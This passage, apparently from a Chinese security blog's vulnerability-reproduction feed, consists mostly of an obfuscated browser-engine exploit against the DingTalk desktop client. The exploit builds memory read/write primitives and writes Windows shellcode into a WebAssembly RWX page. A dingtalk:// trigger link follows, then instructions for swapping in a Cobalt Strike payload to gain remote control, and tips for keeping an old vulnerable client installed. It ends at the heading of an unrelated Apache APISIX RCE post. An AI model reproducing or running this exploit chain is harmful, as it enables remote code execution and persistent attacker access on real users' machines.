class="hljs-string">&#x27;0x23&#x27;</span>,<span class="hljs-string">&#x27;p]KF&#x27;</span>)]=_0xabb024;_0x57fb88[<span class="hljs-title function_">_0x1368</span>(<span class="hljs-string">&#x27;0x25&#x27;</span>,<span class="hljs-string">&#x27;QvKY&#x27;</span>)]();&#125;;createCorruptedPair=<span class="hljs-function">(<span class="hljs-params">_0x16735d,_0x65366a</span>)=&gt;</span>&#123;<span class="hljs-keyword">const</span> _0x5a7565=&#123;<span class="hljs-string">&#x27;__proto__&#x27;</span>:global_object&#125;;_0x5a7565[<span class="hljs-title function_">_0x1368</span>(<span class="hljs-string">&#x27;0x47&#x27;</span>,<span class="hljs-string">&#x27;*I%3&#x27;</span>)]=<span class="hljs-number">0x1</span>;<span class="hljs-title function_">setPropertyViaEmbed</span>(_0x5a7565,_0x65366a,<span class="hljs-function">()=&gt;</span>&#123;<span class="hljs-title class_">Object</span>[<span class="hljs-title function_">_0x1368</span>(<span class="hljs-string">&#x27;0x2c&#x27;</span>,<span class="hljs-string">&#x27;e8CW&#x27;</span>)](global_object,<span class="hljs-literal">null</span>);_0x5a7565[<span class="hljs-title function_">_0x1368</span>(<span class="hljs-string">&#x27;0x8&#x27;</span>,<span class="hljs-string">&#x27;Ub)S&#x27;</span>)]=_0x16735d;&#125;);<span class="hljs-keyword">const</span> _0x2dc8d4=&#123;<span class="hljs-string">&#x27;__proto__&#x27;</span>:global_object&#125;;_0x2dc8d4[<span class="hljs-title function_">_0x1368</span>(<span class="hljs-string">&#x27;0x43&#x27;</span>,<span class="hljs-string">&#x27;THAJ&#x27;</span>)]=<span class="hljs-number">0x1</span>;<span class="hljs-title function_">setPropertyViaEmbed</span>(_0x2dc8d4,_0x65366a,<span class="hljs-function">()=&gt;</span>&#123;<span class="hljs-title class_">Object</span>[<span class="hljs-title function_">_0x1368</span>(<span class="hljs-string">&#x27;0x1&#x27;</span>,<span class="hljs-string">&#x27;@XkD&#x27;</span>)](global_object,<span class="hljs-literal">null</span>);_0x2dc8d4[<span class="hljs-title function_">_0x1368</span>(<span class="hljs-string">&#x27;0xb&#x27;</span>,<span class="hljs-string">&#x27;*j!$&#x27;</span>)]=_0x16735d;_0x5a7565[<span class="hljs-title function_">_0x1368</span>(<span class="hljs-string">&#x27;0x2&#x27;</span>,<span class="hljs-string">&#x27;5I39&#x27;</span>)]=<span class="hljs-number">1.1</span>;&#125;);<span class="hljs-keyword">return</span>[_0x5a7565,_0x2dc8d4];&#125;;<span class="hljs-keyword">const</span> array=[<span class="hljs-number">5.5</span>,<span class="hljs-number">1.1</span>];array[<span class="hljs-string">&#x27;prop&#x27;</span>]=<span class="hljs-number">0x1</span>;<span class="hljs-keyword">const</span> test1=<span class="hljs-keyword">new</span> <span class="hljs-title class_">BigUint64Array</span>(<span class="hljs-number">0x2</span>);<span class="hljs-keyword">var</span> oob_array=[<span class="hljs-number">1.1</span>,<span class="hljs-number">2.2</span>,<span class="hljs-number">3.3</span>];obj_array=&#123;<span class="hljs-string">&#x27;m&#x27;</span>:<span class="hljs-number">0x539</span>,<span class="hljs-string">&#x27;target&#x27;</span>:gc&#125;;ab=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">0x1337</span>);<span class="hljs-title function_">gc</span>();<span class="hljs-title function_">gc</span>();<span class="hljs-title function_">gc</span>();<span class="hljs-keyword">var</span> test=[oob_array,oob_array,oob_array,oob_array,oob_array];test[<span class="hljs-title function_">_0x1368</span>(<span class="hljs-string">&#x27;0x41&#x27;</span>,<span class="hljs-string">&#x27;qlp^&#x27;</span>)]=<span class="hljs-number">0x1</span>;<span class="hljs-keyword">const</span> [object_1,object_2]=<span class="hljs-title function_">createCorruptedPair</span>(array,test);jit=<span class="hljs-function">(<span class="hljs-params">_0x166e60,_0x539576,_0x1ae253</span>)=&gt;</span>&#123;<span class="hljs-keyword">return</span> _0x166e60[<span class="hljs-string">&#x27;corrupted_prop&#x27;</span>][_0x539576];&#125;;<span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> i=<span class="hljs-number">0x0</span>;i&lt;<span class="hljs-number">0x10000</span>;++i)<span class="hljs-title function_">jit</span>(object_1,<span class="hljs-number">0x0</span>);<span class="hljs-keyword">var</span> leak=<span class="hljs-title function_">jit</span>(object_2,<span class="hljs-number">0x0</span>);elem=<span class="hljs-title function_">d2u</span>(leak)[<span class="hljs-number">0x0</span>];<span class="hljs-title function_">print</span>(<span class="hljs-string">&#x27;0x&#x27;</span>+<span class="hljs-title function_">hex</span>(elem));<span class="hljs-keyword">const</span> num=<span class="hljs-title function_">u2d</span>(elem+<span class="hljs-number">0x4</span>,elem+<span class="hljs-number">0x4</span>);<span class="hljs-keyword">const</span> num2=<span class="hljs-title function_">u2d</span>(elem,elem);proto2=&#123;&#125;;setPropertyViaEmbed2=<span class="hljs-function">(<span class="hljs-params">_0x3c4ce8,_0x5b3f78,_0x570b6e</span>)=&gt;</span>&#123;<span class="hljs-keyword">const</span> _0x1411bc=<span class="hljs-variable language_">document</span>[<span class="hljs-title function_">_0x1368</span>(<span class="hljs-string">&#x27;0x3e&#x27;</span>,<span class="hljs-string">&#x27;NbDf&#x27;</span>)](<span class="hljs-title function_">_0x1368</span>(<span class="hljs-string">&#x27;0x2d&#x27;</span>,<span class="hljs-string">&#x27;54b8&#x27;</span>));_0x1411bc[<span class="hljs-title function_">_0x1368</span>(<span class="hljs-string">&#x27;0x44&#x27;</span>,<span class="hljs-string">&#x27;MqJl&#x27;</span>)]=_0x570b6e;_0x1411bc[<span class="hljs-title function_">_0x1368</span>(<span class="hljs-string">&#x27;0x0&#x27;</span>,<span class="hljs-string">&#x27;QvKY&#x27;</span>)]=<span class="hljs-title function_">_0x1368</span>(<span class="hljs-string">&#x27;0x42&#x27;</span>,<span class="hljs-string">&#x27;Xp#V&#x27;</span>);<span class="hljs-title class_">Object</span>[<span class="hljs-title function_">_0x1368</span>(<span class="hljs-string">&#x27;0x1e&#x27;</span>,<span class="hljs-string">&#x27;djTM&#x27;</span>)](proto2,_0x1411bc);<span class="hljs-variable language_">document</span>[<span class="hljs-title function_">_0x1368</span>(<span class="hljs-string">&#x27;0xd&#x27;</span>,<span class="hljs-string">&#x27;h0rH&#x27;</span>)][<span class="hljs-title function_">_0x1368</span>(<span class="hljs-string">&#x27;0x3d&#x27;</span>,<span class="hljs-string">&#x27;54b8&#x27;</span>)](_0x1411bc);_0x3c4ce8[<span class="hljs-title function_">_0x1368</span>(<span class="hljs-string">&#x27;0x33&#x27;</span>,<span class="hljs-string">&#x27;4nv[&#x27;</span>)]=_0x5b3f78;_0x1411bc[<span class="hljs-string">&#x27;remove&#x27;</span>]();&#125;;createCorruptedPair2=<span class="hljs-function">(<span class="hljs-params">_0x31208b,_0x4b08b5</span>)=&gt;</span>&#123;<span class="hljs-keyword">const</span> _0x2fdefd=&#123;<span class="hljs-string">&#x27;__proto__&#x27;</span>:proto2&#125;;_0x2fdefd[<span class="hljs-title function_">_0x1368</span>(<span class="hljs-string">&#x27;0x27&#x27;</span>,<span class="hljs-string">&#x27;pndm&#x27;</span>)]=<span class="hljs-number">0x1</span>;<span class="hljs-title function_">setPropertyViaEmbed2</span>(_0x2fdefd,_0x4b08b5,<span class="hljs-function">()=&gt;</span>&#123;<span class="hljs-title class_">Object</span>[<span class="hljs-string">&#x27;setPrototypeOf&#x27;</span>](proto2,<span class="hljs-literal">null</span>);_0x2fdefd[<span class="hljs-title function_">_0x1368</span>(<span class="hljs-string">&#x27;0x36&#x27;</span>,<span class="hljs-string">&#x27;@XkD&#x27;</span>)]=_0x31208b;&#125;);<span class="hljs-keyword">const</span> _0x5a6d27=&#123;<span class="hljs-string">&#x27;__proto__&#x27;</span>:proto2&#125;;_0x5a6d27[<span class="hljs-title function_">_0x1368</span>(<span class="hljs-string">&#x27;0x3c&#x27;</span>,<span class="hljs-string">&#x27;XQdw&#x27;</span>)]=<span class="hljs-number">0x1</span>;<span class="hljs-title function_">setPropertyViaEmbed2</span>(_0x5a6d27,_0x4b08b5,<span class="hljs-function">()=&gt;</span>&#123;<span class="hljs-title class_">Object</span>[<span class="hljs-title function_">_0x1368</span>(<span class="hljs-string">&#x27;0x9&#x27;</span>,<span class="hljs-string">&#x27;*I%3&#x27;</span>)](proto2,<span class="hljs-literal">null</span>);_0x5a6d27[<span class="hljs-title function_">_0x1368</span>(<span class="hljs-string">&#x27;0xc&#x27;</span>,<span class="hljs-string">&#x27;eHuP&#x27;</span>)]=_0x31208b;_0x2fdefd[<span class="hljs-title function_">_0x1368</span>(<span class="hljs-string">&#x27;0x14&#x27;</span>,<span class="hljs-string">&#x27;QvKY&#x27;</span>)]=<span class="hljs-number">1.1</span>;&#125;);<span class="hljs-keyword">return</span>[_0x2fdefd,_0x5a6d27];&#125;;<span class="hljs-keyword">const</span> [object_3,object_4]=<span class="hljs-title function_">createCorruptedPair2</span>(array,num2);jit22=<span class="hljs-function">(<span class="hljs-params">_0x15b278,_0x32c377</span>)=&gt;</span>&#123;_0x15b278[<span class="hljs-title function_">_0x1368</span>(<span class="hljs-string">&#x27;0x31&#x27;</span>,<span class="hljs-string">&#x27;*clI&#x27;</span>)][_0x32c377]=num2;_0x15b278[<span class="hljs-title function_">_0x1368</span>(<span class="hljs-string">&#x27;0x12&#x27;</span>,<span class="hljs-string">&#x27;1#r2&#x27;</span>)][_0x32c377+<span class="hljs-number">0x1</span>]=<span class="hljs-number">1.1</span>;<span class="hljs-keyword">return</span> _0x15b278[<span class="hljs-title function_">_0x1368</span>(<span class="hljs-string">&#x27;0x1d&#x27;</span>,<span class="hljs-string">&#x27;ow9l&#x27;</span>)][_0x32c377];&#125;;<span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> i=<span class="hljs-number">0x0</span>;i&lt;<span class="hljs-number">0x100000</span>;++i)<span class="hljs-title function_">jit22</span>(object_3,<span class="hljs-number">0x0</span>);<span class="hljs-keyword">var</span> leak2=<span class="hljs-title function_">jit22</span>(object_4,<span class="hljs-number">0x0</span>);<span class="hljs-keyword">var</span> object_idx=<span class="hljs-literal">undefined</span>;<span class="hljs-keyword">var</span> object_idx_flag=<span class="hljs-literal">undefined</span>;<span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> i=<span class="hljs-number">0x0</span>;i&lt;max_size;i++)&#123;<span class="hljs-keyword">if</span>(<span class="hljs-title function_">d2u</span>(oob_array[i])[<span class="hljs-number">0x0</span>]==<span class="hljs-number">0xa72</span>)&#123;<span class="hljs-title function_">print</span>(<span class="hljs-title function_">_0x1368</span>(<span class="hljs-string">&#x27;0x2b&#x27;</span>,<span class="hljs-string">&#x27;CQJJ&#x27;</span>)+i+<span class="hljs-title function_">_0x1368</span>(<span class="hljs-string">&#x27;0x18&#x27;</span>,<span class="hljs-string">&#x27;O6t]&#x27;</span>));<span class="hljs-title function_">print</span>(<span class="hljs-string">&#x27;target:\x20i:\x20&#x27;</span>+i+<span class="hljs-string">&#x27;\x20hi\x201&#x27;</span>);object_idx=i;object_idx_flag=<span class="hljs-number">0x1</span>;<span class="hljs-keyword">break</span>;&#125;<span class="hljs-keyword">if</span>(<span class="hljs-title function_">d2u</span>(oob_array[i])[<span class="hljs-number">0x1</span>]==<span class="hljs-number">0xa72</span>)&#123;<span class="hljs-title function_">print</span>(<span class="hljs-title function_">_0x1368</span>(<span class="hljs-string">&#x27;0x7&#x27;</span>,<span class="hljs-string">&#x27;3nrn&#x27;</span>)+i+<span class="hljs-title function_">_0x1368</span>(<span class="hljs-string">&#x27;0x2f&#x27;</span>,<span class="hljs-string">&#x27;djTM&#x27;</span>));<span class="hljs-title function_">print</span>(<span class="hljs-string">&#x27;target:\x20i:\x20&#x27;</span>+(i+<span class="hljs-number">0x1</span>)+<span class="hljs-title function_">_0x1368</span>(<span class="hljs-string">&#x27;0x18&#x27;</span>,<span class="hljs-string">&#x27;O6t]&#x27;</span>));object_idx=i+<span class="hljs-number">0x1</span>;object_idx_flag=<span class="hljs-number">0x0</span>;<span class="hljs-keyword">break</span>;&#125;&#125;<span class="hljs-keyword">function</span> <span class="hljs-title function_">addrof</span>(<span class="hljs-params">_0x71fee0</span>)&#123;obj_array[<span class="hljs-title function_">_0x1368</span>(<span class="hljs-string">&#x27;0x32&#x27;</span>,<span class="hljs-string">&#x27;qlp^&#x27;</span>)]=_0x71fee0;<span class="hljs-keyword">return</span> <span class="hljs-title function_">d2u</span>(oob_array[object_idx])[object_idx_flag]-<span class="hljs-number">0x1</span>;&#125;<span class="hljs-keyword">var</span> ab_addr=<span class="hljs-title function_">addrof</span>(ab);<span class="hljs-title function_">print</span>(<span class="hljs-string">&#x27;test:\x20&#x27;</span>+<span class="hljs-title function_">hex</span>(ab_addr));<span class="hljs-keyword">var</span> bk_idx=<span class="hljs-literal">undefined</span>;<span class="hljs-keyword">var</span> bk_idx_flag=<span class="hljs-literal">undefined</span>;<span class="hljs-keyword">let</span> flag=<span class="hljs-number">0x0</span>;<span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> i=<span class="hljs-number">0x0</span>;i&lt;max_size;i++)&#123;<span class="hljs-keyword">if</span>(<span class="hljs-title function_">d2u</span>(oob_array[i])[<span class="hljs-number">0x0</span>]==<span class="hljs-number">0x1337</span>)&#123;<span class="hljs-variable language_">console</span>[<span class="hljs-title function_">_0x1368</span>(<span class="hljs-string">&#x27;0x20&#x27;</span>,<span class="hljs-string">&#x27;qxzt&#x27;</span>)](<span class="hljs-title function_">_0x1368</span>(<span class="hljs-string">&#x27;0x40&#x27;</span>,<span class="hljs-string">&#x27;M*(X&#x27;</span>)+i+<span class="hljs-title function_">_0x1368</span>(<span class="hljs-string">&#x27;0x2e&#x27;</span>,<span class="hljs-string">&#x27;1027&#x27;</span>));<span class="hljs-variable language_">console</span>[<span class="hljs-title function_">_0x1368</span>(<span class="hljs-string">&#x27;0x37&#x27;</span>,<span class="hljs-string">&#x27;ki5k&#x27;</span>)](<span class="hljs-title function_">_0x1368</span>(<span class="hljs-string">&#x27;0x17&#x27;</span>,<span class="hljs-string">&#x27;Ob1V&#x27;</span>)+i+<span class="hljs-title function_">_0x1368</span>(<span class="hljs-string">&#x27;0xe&#x27;</span>,<span class="hljs-string">&#x27;*I%3&#x27;</span>));bk_idx=i;bk_idx_flag=<span class="hljs-number">0x1</span>;<span class="hljs-keyword">break</span>;&#125;<span class="hljs-keyword">if</span>(<span class="hljs-title function_">d2u</span>(oob_array[i])[<span class="hljs-number">0x1</span>]==<span class="hljs-number">0x1337</span>)&#123;<span class="hljs-variable language_">console</span>[<span class="hljs-string">&#x27;log&#x27;</span>](<span class="hljs-string">&#x27;m:\x20i:\x20&#x27;</span>+i+<span class="hljs-title function_">_0x1368</span>(<span class="hljs-string">&#x27;0x24&#x27;</span>,<span class="hljs-string">&#x27;qxzt&#x27;</span>));<span class="hljs-variable language_">console</span>[<span class="hljs-title function_">_0x1368</span>(<span class="hljs-string">&#x27;0xf&#x27;</span>,<span class="hljs-string">&#x27;0$K8&#x27;</span>)](<span class="hljs-title function_">_0x1368</span>(<span class="hljs-string">&#x27;0x10&#x27;</span>,<span class="hljs-string">&#x27;1#r2&#x27;</span>)+(i+<span class="hljs-number">0x1</span>)+<span class="hljs-title function_">_0x1368</span>(<span class="hljs-string">&#x27;0x30&#x27;</span>,<span class="hljs-string">&#x27;roPh&#x27;</span>));bk_idx=i+<span class="hljs-number">0x1</span>;bk_idx_flag=<span class="hljs-number">0x0</span>;<span class="hljs-keyword">break</span>;&#125;&#125;<span class="hljs-keyword">var</span> dv=<span class="hljs-keyword">new</span> <span class="hljs-title class_">DataView</span>(ab);<span class="hljs-keyword">var</span> bk_addr=<span class="hljs-title function_">d2u</span>(oob_array[bk_idx]);<span class="hljs-keyword">function</span> <span class="hljs-title function_">get_32</span>(<span class="hljs-params">_0x251c0e</span>)&#123;<span class="hljs-keyword">var</span> _0x524bc3=<span class="hljs-title function_">d2u</span>(oob_array[bk_idx]);<span class="hljs-keyword">if</span>(bk_idx_flag==<span class="hljs-number">0x0</span>)&#123;oob_array[bk_idx]=<span class="hljs-title function_">u2d</span>(_0x251c0e,_0x524bc3[<span class="hljs-number">0x1</span>]);&#125;<span class="hljs-keyword">else</span>&#123;oob_array[bk_idx]=<span class="hljs-title function_">u2d</span>(_0x524bc3[<span class="hljs-number">0x0</span>],_0x251c0e);&#125;<span class="hljs-keyword">return</span> dv[<span class="hljs-string">&#x27;getUint32&#x27;</span>](<span class="hljs-number">0x0</span>,!![]);&#125;<span class="hljs-keyword">function</span> <span class="hljs-title function_">set_32</span>(<span class="hljs-params">_0x2f8305,_0x1a3c26</span>)&#123;<span class="hljs-keyword">var</span> _0xd022f7=<span class="hljs-title function_">d2u</span>(oob_array[bk_idx]);<span class="hljs-keyword">if</span>(bk_idx_flag==<span class="hljs-number">0x0</span>)&#123;oob_array[bk_idx]=<span class="hljs-title function_">u2d</span>(_0x2f8305,_0xd022f7[<span class="hljs-number">0x1</span>]);&#125;<span class="hljs-keyword">else</span>&#123;oob_array[bk_idx]=<span class="hljs-title function_">u2d</span>(_0xd022f7[<span class="hljs-number">0x0</span>],_0x2f8305);&#125;dv[<span class="hljs-title function_">_0x1368</span>(<span class="hljs-string">&#x27;0x1a&#x27;</span>,<span class="hljs-string">&#x27;Ob1V&#x27;</span>)](<span class="hljs-number">0x0</span>,_0x1a3c26,!![]);&#125;<span class="hljs-keyword">function</span> <span class="hljs-title function_">set_8</span>(<span class="hljs-params">_0x5d0cd7,_0x575a5c</span>)&#123;<span class="hljs-keyword">var</span> _0x50493b=<span class="hljs-title function_">d2u</span>(oob_array[bk_idx]);<span class="hljs-keyword">if</span>(bk_idx_flag==<span class="hljs-number">0x0</span>)&#123;oob_array[bk_idx]=<span class="hljs-title function_">u2d</span>(_0x5d0cd7,_0x50493b[<span class="hljs-number">0x1</span>]);&#125;<span class="hljs-keyword">else</span>&#123;oob_array[bk_idx]=<span class="hljs-title function_">u2d</span>(_0x50493b[<span class="hljs-number">0x0</span>],_0x5d0cd7);&#125;dv[<span class="hljs-title function_">_0x1368</span>(<span class="hljs-string">&#x27;0x34&#x27;</span>,<span class="hljs-string">&#x27;tZnn&#x27;</span>)](<span class="hljs-number">0x0</span>,_0x575a5c,!![]);&#125;<span class="hljs-keyword">var</span> wasm_func_addr=<span class="hljs-title function_">addrof</span>(func);<span class="hljs-title function_">print</span>(<span class="hljs-title function_">_0x1368</span>(<span class="hljs-string">&#x27;0x39&#x27;</span>,<span class="hljs-string">&#x27;54b8&#x27;</span>)+<span class="hljs-title function_">hex</span>(wasm_func_addr));<span class="hljs-keyword">var</span> shared_info_addr=<span class="hljs-title function_">get_32</span>(wasm_func_addr+<span class="hljs-number">0xc</span>)-<span class="hljs-number">0x1</span>;<span class="hljs-title function_">print</span>(<span class="hljs-title function_">_0x1368</span>(<span class="hljs-string">&#x27;0x48&#x27;</span>,<span class="hljs-string">&#x27;Xp#V&#x27;</span>)+<span class="hljs-title function_">hex</span>(shared_info_addr));<span class="hljs-keyword">var</span> export_function_data_addr=<span class="hljs-title function_">get_32</span>(shared_info_addr+<span class="hljs-number">0x4</span>)-<span class="hljs-number">0x1</span>;<span class="hljs-title function_">print</span>(<span class="hljs-string">&#x27;export_function_data_addr\x20is:\x20&#x27;</span>+<span class="hljs-title function_">hex</span>(export_function_data_addr));<span class="hljs-keyword">var</span> wasm_instance_addr=<span class="hljs-title function_">get_32</span>(export_function_data_addr+<span class="hljs-number">0x8</span>)-<span class="hljs-number">0x1</span>;<span class="hljs-title function_">print</span>(<span class="hljs-title function_">_0x1368</span>(<span class="hljs-string">&#x27;0x1c&#x27;</span>,<span class="hljs-string">&#x27;p]KF&#x27;</span>)+<span class="hljs-title function_">hex</span>(wasm_instance_addr));<span class="hljs-keyword">var</span> rwx_addr=<span class="hljs-title function_">get_32</span>(wasm_instance_addr+<span class="hljs-number">0x40</span>);<span class="hljs-title function_">print</span>(<span class="hljs-title function_">_0x1368</span>(<span class="hljs-string">&#x27;0x3f&#x27;</span>,<span class="hljs-string">&#x27;M*(X&#x27;</span>)+<span class="hljs-title function_">hex</span>(rwx_addr));<span class="hljs-keyword">var</span> shellcode=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint8Array</span>([<span class="hljs-number">0x89</span>,<span class="hljs-number">0xe5</span>,<span class="hljs-number">0x83</span>,<span class="hljs-number">0xec</span>,<span class="hljs-number">0x20</span>,<span class="hljs-number">0x31</span>,<span class="hljs-number">0xdb</span>,<span class="hljs-number">0x64</span>,<span class="hljs-number">0x8b</span>,<span class="hljs-number">0x5b</span>,<span class="hljs-number">0x30</span>,<span class="hljs-number">0x8b</span>,<span class="hljs-number">0x5b</span>,<span class="hljs-number">0xc</span>,<span class="hljs-number">0x8b</span>,<span class="hljs-number">0x5b</span>,<span class="hljs-number">0x1c</span>,<span class="hljs-number">0x8b</span>,<span class="hljs-number">0x1b</span>,<span class="hljs-number">0x8b</span>,<span class="hljs-number">0x1b</span>,<span class="hljs-number">0x8b</span>,<span class="hljs-number">0x43</span>,<span class="hljs-number">0x8</span>,<span class="hljs-number">0x89</span>,<span class="hljs-number">0x45</span>,<span class="hljs-number">0xfc</span>,<span class="hljs-number">0x8b</span>,<span class="hljs-number">0x58</span>,<span class="hljs-number">0x3c</span>,<span class="hljs-number">0x1</span>,<span class="hljs-number">0xc3</span>,<span class="hljs-number">0x8b</span>,<span class="hljs-number">0x5b</span>,<span class="hljs-number">0x78</span>,<span class="hljs-number">0x1</span>,<span class="hljs-number">0xc3</span>,<span class="hljs-number">0x8b</span>,<span class="hljs-number">0x7b</span>,<span class="hljs-number">0x20</span>,<span class="hljs-number">0x1</span>,<span class="hljs-number">0xc7</span>,<span class="hljs-number">0x89</span>,<span class="hljs-number">0x7d</span>,<span class="hljs-number">0xf8</span>,<span class="hljs-number">0x8b</span>,<span class="hljs-number">0x4b</span>,<span class="hljs-number">0x24</span>,<span class="hljs-number">0x1</span>,<span class="hljs-number">0xc1</span>,<span class="hljs-number">0x89</span>,<span class="hljs-number">0x4d</span>,<span class="hljs-number">0xf4</span>,<span class="hljs-number">0x8b</span>,<span class="hljs-number">0x53</span>,<span class="hljs-number">0x1c</span>,<span class="hljs-number">0x1</span>,<span class="hljs-number">0xc2</span>,<span class="hljs-number">0x89</span>,<span class="hljs-number">0x55</span>,<span class="hljs-number">0xf0</span>,<span class="hljs-number">0x8b</span>,<span class="hljs-number">0x53</span>,<span class="hljs-number">0x14</span>,<span class="hljs-number">0x89</span>,<span class="hljs-number">0x55</span>,<span class="hljs-number">0xec</span>,<span class="hljs-number">0xeb</span>,<span class="hljs-number">0x32</span>,<span class="hljs-number">0x31</span>,<span class="hljs-number">0xc0</span>,<span class="hljs-number">0x8b</span>,<span class="hljs-number">0x55</span>,<span class="hljs-number">0xec</span>,<span class="hljs-number">0x8b</span>,<span class="hljs-number">0x7d</span>,<span class="hljs-number">0xf8</span>,<span class="hljs-number">0x8b</span>,<span class="hljs-number">0x75</span>,<span class="hljs-number">0x18</span>,<span class="hljs-number">0x31</span>,<span class="hljs-number">0xc9</span>,<span class="hljs-number">0xfc</span>,<span class="hljs-number">0x8b</span>,<span class="hljs-number">0x3c</span>,<span class="hljs-number">0x87</span>,<span class="hljs-number">0x3</span>,<span class="hljs-number">0x7d</span>,<span class="hljs-number">0xfc</span>,<span class="hljs-number">0x66</span>,<span class="hljs-number">0x83</span>,<span class="hljs-number">0xc1</span>,<span class="hljs-number">0x8</span>,<span class="hljs-number">0xf3</span>,<span class="hljs-number">0xa6</span>,<span class="hljs-number">0x74</span>,<span class="hljs-number">0x5</span>,<span class="hljs-number">0x40</span>,<span class="hljs-number">0x39</span>,<span class="hljs-number">0xd0</span>,<span class="hljs-number">0x72</span>,<span class="hljs-number">0xe4</span>,<span class="hljs-number">0x8b</span>,<span class="hljs-number">0x4d</span>,<span class="hljs-number">0xf4</span>,<span class="hljs-number">0x8b</span>,<span class="hljs-number">0x55</span>,<span class="hljs-number">0xf0</span>,<span class="hljs-number">0x66</span>,<span class="hljs-number">0x8b</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x41</span>,<span class="hljs-number">0x8b</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x82</span>,<span class="hljs-number">0x3</span>,<span class="hljs-number">0x45</span>,<span class="hljs-number">0xfc</span>,<span class="hljs-number">0xc3</span>,<span class="hljs-number">0xba</span>,<span class="hljs-number">0x78</span>,<span class="hljs-number">0x78</span>,<span class="hljs-number">0x65</span>,<span class="hljs-number">0x63</span>,<span class="hljs-number">0xc1</span>,<span class="hljs-number">0xea</span>,<span class="hljs-number">0x8</span>,<span class="hljs-number">0x52</span>,<span class="hljs-number">0x68</span>,<span class="hljs-number">0x57</span>,<span class="hljs-number">0x69</span>,<span class="hljs-number">0x6e</span>,<span class="hljs-number">0x45</span>,<span class="hljs-number">0x89</span>,<span class="hljs-number">0x65</span>,<span class="hljs-number">0x18</span>,<span class="hljs-number">0xe8</span>,<span class="hljs-number">0xb8</span>,<span class="hljs-number">0xff</span>,<span class="hljs-number">0xff</span>,<span class="hljs-number">0xff</span>,<span class="hljs-number">0x31</span>,<span class="hljs-number">0xc9</span>,<span class="hljs-number">0x51</span>,<span class="hljs-number">0x68</span>,<span class="hljs-number">0x2e</span>,<span class="hljs-number">0x65</span>,<span class="hljs-number">0x78</span>,<span class="hljs-number">0x65</span>,<span class="hljs-number">0x68</span>,<span class="hljs-number">0x63</span>,<span class="hljs-number">0x61</span>,<span class="hljs-number">0x6c</span>,<span class="hljs-number">0x63</span>,<span class="hljs-number">0x89</span>,<span class="hljs-number">0xe3</span>,<span class="hljs-number">0x41</span>,<span class="hljs-number">0x51</span>,<span class="hljs-number">0x53</span>,<span class="hljs-number">0xff</span>,<span class="hljs-number">0xd0</span>,<span class="hljs-number">0x31</span>,<span class="hljs-number">0xc9</span>,<span class="hljs-number">0xb9</span>,<span class="hljs-number">0x1</span>,<span class="hljs-number">0x65</span>,<span class="hljs-number">0x73</span>,<span class="hljs-number">0x73</span>,<span class="hljs-number">0xc1</span>,<span class="hljs-number">0xe9</span>,<span class="hljs-number">0x8</span>,<span class="hljs-number">0x51</span>,<span class="hljs-number">0x68</span>,<span class="hljs-number">0x50</span>,<span class="hljs-number">0x72</span>,<span class="hljs-number">0x6f</span>,<span class="hljs-number">0x63</span>,<span class="hljs-number">0x68</span>,<span class="hljs-number">0x45</span>,<span class="hljs-number">0x78</span>,<span class="hljs-number">0x69</span>,<span class="hljs-number">0x74</span>,<span class="hljs-number">0x89</span>,<span class="hljs-number">0x65</span>,<span class="hljs-number">0x18</span>,<span class="hljs-number">0xe8</span>,<span class="hljs-number">0x87</span>,<span class="hljs-number">0xff</span>,<span class="hljs-number">0xff</span>,<span class="hljs-number">0xff</span>,<span class="hljs-number">0x31</span>,<span class="hljs-number">0xd2</span>,<span class="hljs-number">0x52</span>,<span class="hljs-number">0xff</span>,<span class="hljs-number">0xd0</span>]);<span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> i=<span class="hljs-number">0x0</span>;i&lt;shellcode[<span class="hljs-title function_">_0x1368</span>(<span class="hljs-string">&#x27;0x21&#x27;</span>,<span class="hljs-string">&#x27;h0rH&#x27;</span>)];i++)<span class="hljs-title function_">set_8</span>(rwx_addr+i,shellcode[i]);<span class="hljs-title function_">func</span>();</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>触发：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apl">dingtalk://dingtalkclient/page/link?url=http://127.0.0.1/test.html&amp;pc_slide=true<br></code></pre></td></tr></table></figure><p>v6.3.5.10278702</p><p><img src="https://s4.ax1x.com/2022/02/22/bSrjk6.png" alt=""></p><p>v6.0.30.9178701</p><p><img src="https://s4.ax1x.com/2022/02/22/bSsCXd.png" alt=""></p><h3 id="0x03-上线CS">0x03 上线CS</h3><ul><li>CS 生成 C类payload，32位</li><li>替换payload 中 <code>\</code> 为 <code>,0 </code></li><li>填充 <code>var shellcode=new Uint8Array([.....])</code></li></ul><p><img src="https://s4.ax1x.com/2022/02/22/bSsk7t.png" alt=""></p><h3 id="0x04-坑">0x04 坑</h3><ul><li><p>直接安装旧版钉钉无法登录，会提示 <code>为了账户安全，请到官网下载最新版本</code> 之类。</p><p>下载新版安装并登录，关闭自动更新，退出，再次重新安装旧版可解决。</p></li><li><p>退出再次打开会自动更新到最新版本。</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vuln</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Apache APISIX Dashboard RCE</title>
    <link href="/posts/af29eede.html"/>
    <url>/posts/af29eede.html</url>
    
